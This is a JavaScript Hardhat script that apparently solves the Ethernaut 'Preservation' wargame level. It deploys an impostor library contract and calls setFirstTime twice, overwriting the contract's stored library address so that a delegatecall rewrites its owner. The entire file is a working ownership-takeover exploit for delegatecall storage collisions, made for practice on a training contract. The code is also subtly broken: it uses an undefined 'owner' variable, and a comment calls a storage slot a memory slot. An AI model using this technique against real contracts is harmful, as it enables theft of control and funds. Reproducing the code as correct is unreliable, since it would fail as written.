const { ethers } = require("hardhat");
const Runner = require('./lib/runner');
const Deployer = require('./deployer');

Runner.run(async () => { 
    
    //PLACE Preservation CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const contractAddr = "0x12D961E749a60BB6bb1b3F0ca1Ed590A2F11562c"; 
    
    //get the Ethernaut Preservation contract 
    const contract = await ethers.getContractAt("Preservation", contractAddr);
    
    //deploy impostor contract
    const impostor = await Deployer.deploy();
    
    console.log("* * * ");
    console.log(`original owner is: ${await contract.owner()}`);
    
    //modify the first memory slot of the contract 
    await contract.setFirstTime(impostor.address);
    
    //now invoke the impostor library contract 
    await contract.setFirstTime(owner.address);
    
    //announce the new owner 
    console.log(`new owner is: ${await contract.owner()}`);
    console.log("* * * ");
});
